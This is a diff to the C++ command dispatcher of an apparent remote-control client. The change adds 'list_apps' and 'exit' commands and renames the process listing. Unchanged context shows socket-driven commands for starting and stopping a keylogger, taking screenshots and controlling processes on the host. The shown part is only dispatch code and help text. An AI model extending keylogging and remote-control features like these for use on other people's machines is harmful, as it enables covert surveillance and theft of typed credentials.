@@ -186,9 +186,10 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string helpMsg = 
             "Available commands:\n"
             "  help                    - Show this help message\n"
-            "  list                    - List all running processes\n"
+            "  list_services           - List all running services\n"
             "  start <path>            - Start a process from given path\n"
             "  stop <process_name>     - Stop a process by name\n"
+            "  list_apps               - List all visible applications\n"
             "  start_keylogger         - Start keylogger\n"
             "  stop_keylogger          - Stop keylogger\n"
             "  screenshot <filename>   - Capture screen and save as PNG\n"
@@ -200,7 +201,7 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             "  exit                    - Disconnect from server\n";
         sendResponse(sock, helpMsg);
     }
-    else if (cmd == "list")
+    else if (cmd == "list_services")
     {
         std::string processes = listProcesses();
         sendResponse(sock, processes);
@@ -219,6 +220,18 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         bool ok = stopProcess(name);
         std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
         sendResponse(sock, msg);
+    }
+    else if (cmd == "list_apps")
+    {
+        std::string apps = listUserApps();
+        sendResponse(sock, apps);
+    }
+    else if (cmd == "exit")
+    {
+        std::string msg = "Disconnecting from server...";
+        sendResponse(sock, msg);
+        closesocket(sock);
+        return; // Kết thúc hàm để không xử lý thêm lệnh nào nữa
     }
     else if (cmd == "start_keylogger")
     {
